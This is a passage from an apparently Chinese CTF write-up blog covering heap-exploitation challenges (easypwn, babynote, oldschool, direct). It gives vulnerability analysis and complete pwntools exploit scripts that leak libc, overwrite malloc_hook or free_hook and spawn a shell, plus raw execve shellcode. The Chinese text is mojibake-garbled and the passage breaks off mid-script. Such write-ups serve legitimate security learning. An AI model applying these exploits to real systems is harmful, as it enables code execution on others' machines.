timelocal_file  = &#39;./easypwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;39.101.184.181&#39;,10000)    libc = elf.libc    # libc = ELF(&#39;./libc-easypwn.so&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size):    sla(&#39;choice&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))def edit(idx,data):    sla(&#39;choice&#39;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))    sa(&#39;tent&#39;,str(data))def delete(idx):    sla(&#39;ice&#39;,&#39;3&#39;)    sla(&#39;idx&#39;,str(idx))def leak_addr():    add(0x30) #0    add(0x98) #1    add(0xf0) #2    add(0x98) #3    add(0x40)    delete(0)    #null off by one    edit(1,&#39;d&#39;*0x90 + p64(0xa0 + 0x40))    delete(2)    add(0xe8 - 0x30)    add(0xe8)    add(0x20)    delete(2)    payload = p64(0) * 7 * 2 + p64(0) + p64(0xf1) +p64(0)+ p16(0x57f8- 0x10) + &#39;\n&#39;    edit(1,payload)    add(0xe8)    delete(2)    payload = p64(0) * 7 * 2 + p64(0) + p64(0xf1) + p16(0x45cf) + &#39;\n&#39;    edit(1,payload)    add(0xe8)    add(0xe8)    edit(6, &#39;b&#39; * 0x41 + p64(0xfbad3c80) + p64(0) * 3 + p8(0) + &#39;\n&#39;)leak = 0while True:    try:        leak_addr()        ss = io.recvuntil(chr(0x7f),timeout = 0.5)        if len(ss) == 0:            raise Exception(&#39;&#39;)        io.recv(10)        leak = uu64(r(6))        if leak == 0x7ff81b57b6a3:            raise Exception(&#39;&#39;)        break    except Exception:        io.close()        io = process(&#39;./easypwn&#39;)        # io = remote(&#39;39.101.184.181&#39;,10000)        continueinfo_addr(&#39;leak&#39;,leak)libc_addr = leak - 0x3c56a3info_addr(&#39;libc_base&#39;,libc_addr)delete(2)edit(1, p64(0) * 7 * 2 + p64(0) + p64(0xf1) + p64(libc_addr + libc.symbols[&#39;_IO_2_1_stdin_&#39;] + 143) + &#39;\n&#39;)add(0xe8)add(0xe8)edit(7,&#39;\0&#39; * 0xe1 + p32(0xf1) + &#39;\n&#39;)delete(2)edit(1, p64(0) * 7 * 2 + p64(0) + p64(0xf1) + p64(libc_addr + libc.symbols[&#39;_IO_2_1_stdin_&#39;] + 376) + &#39;\n&#39;)add(0xe8)add(0xe8)rec = libc_addr + 0xf0364# realloc = libc_addr + libc.symbols[&#39;realloc&#39;] + realloc[1]payload = &#39;\x00&#39; * 0xa0 + p64(rec) + p64(rec) + &#39;\n&#39;edit(8, payload)info_addr(&#39;libc_base&#39;,libc_addr)add(0xe8)itr()# 0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)# constraints:#   rax == NULL# 0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)# constraints:#   [rsp+0x30] == NULL# 0xf0364 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)# constraints:#   [rsp+0x50] == NULL# 0xf1207 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)# constraints:#   [rsp+0x70] == NULL</code></pre><h2 id="babynote"><a href="#babynote" class="headerlink" title="babynote"></a>babynote</h2><h3 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h4 id="regist"><a href="#regist" class="headerlink" title="regist()"></a>regist()</h4><pre><code class="c"> strcpy(name, &amp;s);                             </code></pre><pre><code class="c"> __isoc99_scanf(&quot;%lld&quot;, &amp;age1); // é•¿æ•´æ•°</code></pre><p>å¯èƒ½é€ æˆæº¢å‡ºã€‚åœ¨æ ˆä¸­ï¼Œå…¶ä¸‹é¢ç´§æŒ¨ç€ageã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/n2fCnS.png" srcset="/img/loading.gif" alt></p><p>åœ¨bssæ®µï¼Œå…¶ä¸‹é¢ç´§æŒ¨ç€heapå­˜æ”¾çš„åœ°å€ã€‚</p><h4 id="addnote"><a href="#addnote" class="headerlink" title="addnote()"></a>addnote()</h4><ul><li>åªèƒ½ç”³è¯·6ä¸ªå †ã€‚</li><li>ç”³è¯·äº†ä¸€ä¸ªå †ï¼Œå…¶sizeæ”¾åœ¨è·ç¦»å…¶å †åœ°å€Â·<code>6 * 8</code>çš„ä½ç½®ã€‚</li><li>å¯ä»¥æ ¹æ®å †åºå·ç”³è¯·å †ï¼Œåˆ¤æ–­å †åºå·æ˜¯å¦å­˜åœ¨çš„ä¾æ®ï¼šæ­¤å †å¯¹åº”çš„sizeä½æœ‰æ²¡æœ‰æ•°å€¼ï¼ˆä¹Ÿé€‚ç”¨äºshownoteï¼Œdeletenote,editnoteï¼‰<h4 id="deletenote"><a href="#deletenote" class="headerlink" title="deletenote()"></a>deletenote()</h4></li></ul><pre><code class="c">if ( v1 &lt;= 3 )                                // å¯ä»¥è¾“å…¥è´Ÿæ•°  {    if ( *(_QWORD *)&amp;m[4 * (v1 + 0xALL)] )    {      free(*(void **)&amp;m[4 * (v1 + 4LL)]);// åç¼–è¯‘é”™äº† æ˜¯8 *ï¼ˆxxï¼‰      *(_QWORD *)&amp;m[4 * (v1 + 0xALL)] = 0LL;//uaf heapæ²¡æœ‰æ¸…0,size æ¸…0      puts(&quot;Done!&quot;);    }</code></pre><ul><li>å­˜åœ¨uaf</li><li>åªèƒ½åˆ é™¤<code>idx&lt;=3</code> çš„å †</li><li>å¯ä»¥è¾“å…¥è´Ÿå †å·ï¼Œå¯ä»¥æ ¹æ®å…¶é€»è¾‘æ¥åˆ é™¤ä¸€äº›ç‰¹æ®Šçš„å †</li></ul><h4 id="editnote"><a href="#editnote" class="headerlink" title="editnote()"></a>editnote()</h4><pre><code class="c">if ( v1 &lt;= 3 &amp;&amp; v1 &gt;= 0 )</code></pre><ul><li>åªèƒ½ç¼–è¾‘å‰4ä¸ªå †</li></ul><h3 id="æ”»å‡»æ€è·¯-1"><a href="#æ”»å‡»æ€è·¯-1" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>leak libc</li><li>free(-1) free(-2) åˆ é™¤æ‰motto nameçš„å †å—</li><li>åˆ©ç”¨resetï¼Œè°ƒç”¨registï¼Œåˆ©ç”¨strcpyæ¥æº¢å‡ºageçš„æ•°å€¼ï¼Œæ§åˆ¶ç¬¬ä¸€ä¸ªchunkçš„sizeï¼Œé€ æˆä¸€ä¸ªå †å—é‡å </li><li>åˆ é™¤0ã€1ã€2chunkï¼Œç”³è¯·ä¸€ä¸ªå¤§çš„chunkï¼Œå¯ä»¥è¦†ç›–åˆ°chunk 1çš„fdä»è€Œä¿®æ”¹ï¼Œè¿›è¡Œfastbin attack</li><li>æ‰“malloc hook ä¸º one gadget</li></ul><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./babynotes&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27411)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def reg(name,motto,age):    sa(&#39;name&#39;,str(name))    sa(&#39;motto&#39;,str(motto))    sla(&#39;age&#39;,str(age))def add(idx,size):    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;size&#39;,str(size))def show(idx):    sla(&#39;&gt;&gt;&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def free(idx):    sla(&#39;&gt;&gt;&#39;,&#39;3&#39;)    # if int(idx) &lt;=3:    sla(&#39;dex&#39;,str(idx))    # if int(idx) &gt;3:        # idx = def edit(idx,data):    sla(&#39;&gt;&gt;&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))    sa(&#39;note&#39;,str(data))def reset(name,motto,age):    sla(&#39;&gt;&gt;&#39;,&#39;5&#39;)    reg(name,motto,age)name = &#39;a&#39; * 0x18motto = &#39;b&#39; * 0x20age = 0x100reg(name,motto,age)add(0,0x58) add(1,0x68) add(2,0x68)add(3,0x100) add(4,0x18) free(3)add(5,0x68)show(5)ru(&#39;ote 5: &#39;)libc_base = uu64(r(6)) - 0x3c4c78info_addr(&#39;libc&#39;,libc_base)free(-1)free(-2)age = 0x1111111100000141reset(name,&#39; &#39;,age)free(0)free(1)free(2)add(0,0x100)malloc_hook = 0x3c4aed + libc_basepayload = 11 * p64(0) + p64(0x71) + p64(malloc_hook)edit(0,payload)add(1,0x68)add(2,0x68)add(3,0x68)one = 0xf0364 + libc_basepayload = (0x13-8) * &#39;1&#39; + p64(0) + p64(one)edit(3,payload)free(3)itr()</code></pre><p>è¿˜æœ‰ä¸€ç§æ€è·¯ï¼Œå°±æ˜¯å› ä¸ºbssæ®µçš„ageï¼Œfreeï¼ˆ-3ï¼‰ä¹Ÿå¯ä»¥è¿›è¡Œfreeçš„ï¼Œæ§åˆ¶å…¶ä¸ºä¸€ä¸ª0x68å †å—åœ°å€çš„è¯ï¼Œå°±å¯ä»¥å‡ºç°ä¸€ä¸ª0x70çš„fastbinå—ï¼Œç„¶åå…¶sizeæ˜¯ä¸ä¼šåŒ—æŠ¹é™¤çš„ï¼Œæ‰€ä»¥åˆ©ç”¨uafç›´æ¥editå…¶fdä¸ºmalloc hookï¼Œfastbin attack æ”»å‡»å³å¯ã€‚</p><h3 id="å¦ä¸€ç§æ‰“æ³•"><a href="#å¦ä¸€ç§æ‰“æ³•" class="headerlink" title="å¦ä¸€ç§æ‰“æ³•"></a>å¦ä¸€ç§æ‰“æ³•</h3><h4 id="addnote-1"><a href="#addnote-1" class="headerlink" title="addnote()"></a>addnote()</h4><pre><code class="c">   puts(&quot;Input note size: &quot;);      __isoc99_scanf(&quot;%lld&quot;, &amp;size);      if ( (signed __int64)size &lt;= 0x100 )      {</code></pre><p>è¿™é‡Œæœ‰ä¸ªé—æ¼ç‚¹ï¼Œaddçš„sizeæ˜¯å¯ä»¥è¾“å…¥è´Ÿçš„</p><h4 id="house-of-forceä½¿ç”¨æ¡ä»¶"><a href="#house-of-forceä½¿ç”¨æ¡ä»¶" class="headerlink" title="house of  forceä½¿ç”¨æ¡ä»¶"></a>house of  forceä½¿ç”¨æ¡ä»¶</h4><p>æ¯”èµ›æ—¶æ²¡æœ‰æƒ³åˆ°ï¼Œå› ä¸ºhouse of  forceç›¸å…³çš„æœ‰ç‚¹é—å¿˜äº†ã€‚</p><ul><li>å¯ä»¥æº¢å‡ºåˆ°top chunkçš„ sizeï¼Œç¯¡æ”¹ size ä¸ºä¸€ä¸ªå¾ˆå¤§å€¼,å°±å¯ä»¥è½»æ¾çš„é€šè¿‡top chunkçš„ç›¸å…³éªŒè¯ï¼Œå¸¸è§å°±æ˜¯ä¿®æ”¹ä¸º <code>-1</code> </li><li>å¯ä»¥ç”³è¯·ä»»æ„sizeçš„å †å—ï¼Œæ­£è´Ÿéƒ½è¡Œï¼Œä½†æ˜¯æœ‰ä¸åŒçš„æ”»å‡»é™åˆ¶</li></ul><p>è¿™é¢˜æ˜¯å¯ä»¥æ»¡è¶³çš„:</p><ul><li>åˆ©ç”¨strcpyæ¥æº¢å‡ºageçš„æ•°å€¼ ï¼Œå¾ˆç®€å•çš„æ§åˆ¶top chunkçš„ size</li><li>å¯ä»¥ç”³è¯·è´Ÿçš„å †å—ï¼Œè´Ÿçš„å †å—å¯ä»¥æ‰“heap æˆ–è€… got ï¼Œè·å–ä¸€ä¸ªä»»æ„åœ°å€å†™,<strong>é€šå¸¸åº”è¯¥éƒ½æ˜¯æ‰“heap</strong></li></ul><h4 id="æ”»å‡»æ€è·¯-2"><a href="#æ”»å‡»æ€è·¯-2" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><ul><li>ä¿®æ”¹top chunkçš„size</li><li>åˆ©ç”¨house of  forceï¼Œå°†top chunkå‘å‰ç§»åŠ¨ï¼Œä½¿å¾—å…¶ä¸ç°æœ‰çš„chunké‡åˆ</li><li>ç„¶åé€šè¿‡mallocä¸€ä¸ªå°å †å—ï¼Œæ„é€ å¥½ fake chunkï¼Œæ§åˆ¶ç°æœ‰å †çš„sizeå’Œprev_sizeå_</li><li>åšunlinkï¼Œå®ç°ä»»æ„åœ°å€è¯»å†™ã€‚</li></ul><h4 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">#coding:utf8from pwn import *sh = process(&#39;./babynotes&#39;)# sh = remote(&#39;123.56.170.202&#39;,43121)elf = ELF(&#39;./babynotes&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;)free_got = elf.got[&#39;free&#39;]def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(sh)    pause()context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]sh.sendafter(&#39;Input your name:&#39;,&#39;haivk&#39;)sh.sendafter(&#39;Input your motto:&#39;,&#39;pwnit&#39;)sh.sendlineafter(&#39;Input your age:&#39;,&#39;1&#39;)def add(index,size):   sh.sendlineafter(&#39;&gt;&gt;&#39;,&#39;1&#39;)   sh.sendlineafter(&#39;Input index:&#39;,str(index))   sh.sendlineafter(&#39;Input note size:&#39;,str(size))def show(index):   sh.sendlineafter(&#39;&gt;&gt;&#39;,&#39;2&#39;)   sh.sendlineafter(&#39;Input index:&#39;,str(index))def delete(index):   sh.sendlineafter(&#39;&gt;&gt;&#39;,&#39;3&#39;)   sh.sendlineafter(&#39;Input index:&#39;,str(index))def edit(index,content):   sh.sendlineafter(&#39;&gt;&gt;&#39;,&#39;4&#39;)   sh.sendlineafter(&#39;Input index:&#39;,str(index))   sh.sendafter(&#39;Input your note:&#39;,content)def reset():   sh.sendlineafter(&#39;&gt;&gt;&#39;,&#39;5&#39;)add(0,0x100)add(1,0x100)add(2,0x100)reset()sh.sendafter(&#39;Input your name:&#39;,&#39;haivk&#39;.ljust(0x18,&#39;a&#39;))sh.sendafter(&#39;Input your motto:&#39;,&#39;pwnit&#39;)sh.sendlineafter(&#39;Input your age:&#39;,&#39;-1&#39;)add(4,-0x370)add(3,0x20)#top chunkä¸Šç§»edit(3,p64(0x100) + p64(0x110))heap0_ptr_addr = 0x6020E0edit(0,p64(0) + p64(0x101) + p64(heap0_ptr_addr - 0x18) + p64(heap0_ptr_addr - 0x10))debug()#unlinkdelete(1)debug()edit(0,p64(0)*3 + p64(free_got))show(0)sh.recvuntil(&#39;Note 0: &#39;)free_addr = u64(sh.recv(6).ljust(8,&#39;\x00&#39;))libc_base = free_addr - libc.sym[&#39;free&#39;]system_addr = libc_base + libc.sym[&#39;system&#39;]edit(0,p64(system_addr))edit(2,&#39;/bin/sh\x00&#39;)#getshelldelete(2)sh.interactive()</code></pre><p>exp æ¥è‡ª haivk å¤§å¸ˆå‚…ã€‚</p><h2 id="oldschool"><a href="#oldschool" class="headerlink" title="oldschool"></a>oldschool</h2><h3 id="åˆ†æ-5"><a href="#åˆ†æ-5" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç»™äº†æºç ï¼Œåˆ†æç¨‹åºå¸¦æ¥äº†å¾ˆå¤§çš„ä¾¿åˆ©ã€‚<br>ä¼šå‘ç°å¾ˆå¤šåœ°æ–¹å¯¹sizeå¤§å°éªŒè¯ä¸æ˜¯å¾ˆå¤šï¼Œæ˜¯è´Ÿæ•°ä¹Ÿè¡Œï¼Œä½†æ˜¯å¯¹æ­¤é¢˜çš„æ”»å‡»ï¼Œç”¨é€”å¹¶ä¸å¤§ã€‚</p><pre><code class="c"> g_ptr =  mmap(ADDR_LOW + idx, ADDR_HIGH - ADDR_LOW - idx, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); </code></pre><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ç”³è¯·çš„mmapåŒºï¼Œæ˜¯å¯ä»¥è¿›è¡Œæ‰§è¡Œçš„ï¼Œå¯ä»¥è€ƒè™‘ä¸€ä¸‹shellcodeã€‚</p><h4 id="æ¼æ´ç‚¹-2"><a href="#æ¼æ´ç‚¹-2" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><pre><code class="c">void mmap_edit(){    if(g_ptr == NULL){        printf(&quot;Mmap first!&quot;);        return;    }    unsigned value;    unsigned idx;    printf(&quot;Index: &quot;);    idx = get_int();     if(g_ptr + idx &lt; g_ptr &amp;&amp; (unsigned)(g_ptr + idx) &lt; ADDR_HIGH){        puts(&quot;Invalid idx&quot;);        return;    }    printf(&quot;Value: &quot;);    value = get_int();     g_ptr[idx] = value;}</code></pre><p>å¯ä»¥çœ‹åˆ°å…¶å¯¹<code>g_ptr + idx</code>çš„éªŒè¯æ˜¯å¾ˆç®€å•çš„ï¼Œç»™è¶³å¤§çš„åç§»ï¼Œå¯ä»¥æ”¹åˆ°libcçš„ã€‚æ˜¯ä¸€ä¸ªæ•°ç»„æº¢å‡ºã€‚</p><h3 id="æ”»å‡»æ€è·¯-3"><a href="#æ”»å‡»æ€è·¯-3" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><h4 id="æ€è·¯1"><a href="#æ€è·¯1" class="headerlink" title="æ€è·¯1:"></a>æ€è·¯1:</h4><ul><li>å…ˆæ­£å¸¸åˆ†é…ï¼Œæ³„æ¼å‡ºlibcåœ°å€</li><li>åˆ†é…ä¸€ä¸‹mmapï¼Œåˆ©ç”¨æ•°ç»„æº¢å‡ºï¼Œè¿›è¡Œä¿®æ”¹<code>malloc_hook</code>ï¼Œä¸ºmmapçš„åœ°å€ã€‚</li><li>åœ¨mmapçš„å†…å­˜ä¸Šå¡«ä¸Šshellcode</li></ul><h4 id="æ€è·¯2"><a href="#æ€è·¯2" class="headerlink" title="æ€è·¯2:"></a>æ€è·¯2:</h4><ul><li>å…ˆæ­£å¸¸åˆ†é…ï¼Œæ³„æ¼å‡ºlibcåœ°å€</li><li>åˆ†é…ä¸€ä¸‹mmapï¼Œåˆ©ç”¨æ•°ç»„æº¢å‡ºï¼Œè¿›è¡Œä¿®æ”¹<code>free_hook</code>ï¼Œä¸ºsystemã€‚</li><li>free ä¸€ä¸ª å¸¦æœ‰<code>/bin/sh</code>çš„chunkå³å¯</li></ul><p>è¿™ä¸ªæ›´å¥½ç‚¹ã€‚</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27411)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size):    sla(&#39;ice&#39;,&#39;1&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;ize&#39;,str(size))def edit(idx,data):    sla(&#39;ice&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))    sa(&#39;tent&#39;,str(data))def show(idx):    sla(&#39;ice&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))def free(idx):    sla(&#39;ice&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))def mmap_add(addr):    sla(&#39;ice&#39;,&#39;6&#39;)    sla(&#39;start&#39;,str(addr))def mmap_edit(idx,data):    sla(&#39;ice&#39;,&#39;7&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;lue&#39;,str(data))for i in range(8):    add(i,0x90)add(9,0x10)for i in range(7):    free(i)free(7)add(10,0x10)show(10)ru(&#39;ent: &#39;)libc_base = uu32(r(4)) - 0x1d8828info_addr(&#39;libc&#39;,libc_base)system = 0x3d200 + libc_basefree_hook = 0x1d98d0 + libc_basemmap_add(0)&#39;&#39;&#39;# one wayoffset = ((libc_base+0x1d8788 - 0xe0000000)) / 4mmap_edit(offset,&#39;3758096384&#39;)shellcode = &#39;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&#39;shellcode = [int(0xd231c931),int(0x2f2f6852),int(0x2f686873),int(0x896e6962),int(0xb0c031e3),int(0x80cd0b)]for i in range(len(shellcode)):    mmap_edit(i,shellcode[i])add(13,0x10)&#39;&#39;&#39;# two wayoffset = ((free_hook - 0xe0000000)) / 4mmap_edit(offset,int(system))edit(9,&#39;/bin/sh\x00&#39; + &#39;\n&#39;)free(9)itr()</code></pre><h2 id="direct"><a href="#direct" class="headerlink" title="direct"></a>direct</h2><h3 id="åˆ†æ-6"><a href="#åˆ†æ-6" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h4 id="addå‡½æ•°"><a href="#addå‡½æ•°" class="headerlink" title="addå‡½æ•°"></a>addå‡½æ•°</h4><ul><li><p>ç”³è¯·çš„chunkæœ€å¤§å€¼ä¸º0x100,maxä¸º16ä¸ª</p></li><li><p>sizeå¯ä»¥ä¸ºè´Ÿå€¼</p><h4 id="editå‡½æ•°"><a href="#editå‡½æ•°" class="headerlink" title="editå‡½æ•°"></a>editå‡½æ•°</h4></li><li><p>offset, size éƒ½å¯ä»¥ä¸ºè´Ÿå€¼</p></li><li><p><code>read(0, (void *)(heaplist[idx] + offset), nbytes);</code> è¿™é‡Œå­˜åœ¨è´Ÿæº¢å‡ºï¼Œå¯ä»¥ä¿®æ”¹ä¸Šä¸€ä¸ªchunké‡Œé¢çš„å€¼</p></li></ul><h4 id="open-fileå‡½æ•°"><a href="#open-fileå‡½æ•°" class="headerlink" title="open fileå‡½æ•°"></a>open fileå‡½æ•°</h4><ul><li>åªèƒ½è°ƒç”¨ä¸€æ¬¡ï¼Œè°ƒç”¨åå¯ä»¥è¿›è¡Œedit chunk</li></ul><h4 id="close-å‡½æ•°"><a href="#close-å‡½æ•°" class="headerlink" title="close å‡½æ•°"></a>close å‡½æ•°</h4><pre><code class="c">result = (ssize_t)readdir(dirp);    v1 = result;    if ( result )    {      put(&quot;Filename: &quot;);      result = put2(v1 + 0x13);</code></pre><p>è¿›è¡Œæ‰“å°æ–‡ä»¶åã€‚</p><p>å¯ä»¥çœ‹åˆ°æ¼æ´ç‚¹å°±æ˜¯åœ¨edité‚£é‡Œï¼Œä¸”æ²¡æœ‰showå‡½æ•°ã€‚leak libcæ˜¯æ­¤é¢˜çš„éš¾ç‚¹ã€‚å› ä¸ºæ˜¯æ²¡æœ‰putså‡½æ•°è¿›è¡Œè¾“å‡ºï¼Œæ‰€ä»¥æ”»å‡»stdoutä¹Ÿæ²¡æœ‰ç”¨ã€‚</p><p><strong>é‡ç‚¹æ˜¯äº†è§£opendir å’Œ readdirã€‚</strong><br>å‚è€ƒé“¾æ¥ï¼š<br><a href="https://blog.csdn.net/cainiao000001/article/details/80988738" target="_blank" rel="noopener">https://blog.csdn.net/cainiao000001/article/details/80988738</a></p><p>å¯ä»¥å‘ç°ï¼Œåœ¨è°ƒç”¨opendirå’Œreaddiråï¼Œæ–‡ä»¶åæ˜¯å­˜åœ¨äºå†…å­˜ä¸­çš„ã€‚ç„¶åå› ä¸ºç¨‹åºçš„å†™æ³•ï¼Œä¼šç›´æ¥è¾“å‡ºä¸€ä¸‹<code>.</code>çš„æ–‡ä»¶åï¼Œå†æ¬¡è°ƒç”¨ä¼šè¾“å‡º<code>..</code>çš„æ–‡ä»¶åï¼Œä¹Ÿæ˜¯<code>0x13</code>çš„åç§»å¤„ã€‚é‚£ä¹ˆæƒ³åŠæ³•æº¢å‡ºä¿®æ”¹è¿™é™„è¿‘çš„å†…å­˜ï¼Œåœ¨æ‰“å°æ–‡ä»¶åçš„æ—¶å€™ï¼ŒæŠŠlibcåœ°å€ä¹Ÿç»™å°å‡ºæ¥ã€‚</p><h3 id="æ”»å‡»æ€è·¯-4"><a href="#æ”»å‡»æ€è·¯-4" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>å…ˆç”³è¯·8ä¸ªå †ï¼Œç„¶åé‡Šæ”¾å®Œï¼Œè®©å…¶å­˜åœ¨ä¸€ä¸ªåœ¨unsortbinçš„chunkï¼Œä¸”ç•™å‡ºä¸€ä¸ªå‡†å¤‡ä¸Šæº¢å‡ºæ”»å‡»çš„chunk</li><li>openfileä¸€ä¸‹ï¼Œåœ¨heapä¸Šç”³è¯·ä¸€ä¸ªå·¨å¤§çš„chunk</li><li>ä¸Šæº¢å‡ºæ”»å‡»ï¼ŒæŠŠåŠ å…¥unsortbinçš„chunkçš„sizeç»™ä¿®æ”¹å¤§ä¸€ç‚¹,è¦†ç›–åˆ°ä¸Šé¢é‚£ä¸ªå·¨å¤§çš„chunkï¼Œä¸”è¿™ä¸ªå·¨å¤§å †çš„next chunkçš„prev size è¦å¡«ä¸Šåˆé€‚çš„å¤§å°ï¼Œç»•è¿‡å¯¹unsortbin çš„æ£€æŸ¥ã€‚</li><li>closeä¸€ä¸‹ï¼Œä¼šåœ¨åˆšåˆšå·¨å¤§çš„chunkä¸­ç•™ä¸‹direntç»“æ„ä½“ï¼Œå…¶ä¸­ä¼šåŒ…å«filename</li><li>ç”³è¯·å †åˆ°<code>..</code>è¿™ä¸ªæ–‡ä»¶åçš„é™„è¿‘ï¼Œå› ä¸ºæ˜¯unsortbinï¼Œä¼šåœ¨å…¶ä¸‹é¢ç•™ä¸‹libcåœ°å€ï¼Œå‡†å¤‡æ³„æ¼ï¼ˆè¿™ä¸ªè¦æ³¨æ„ï¼Œå°½é‡ä¸è¦ç ´ådirentç»“æ„ä½“çš„æ•°æ®ï¼Œç ´ååå®¹æ˜“æ— æ³•è¾“å‡ºfilenameï¼‰</li><li>ä¸Šæº¢æ”»å‡»<code>..</code>çš„æ–‡ä»¶åï¼Œç»™å…¶ä¿®æ”¹å…¶ä»–åˆé€‚çš„åå­—ï¼Œæ³„æ¼å‡ºlibcåœ°å€</li><li>å‰©ä¸‹çš„å°±ç®€å•äº†ï¼Œä¸Šæº¢æ”»å‡»tcache chainï¼Œä¿®æ”¹ä¸ºfree hook</li><li>æ”»å‡»free hook ä¸ºone gadget</li></ul><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27411)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # 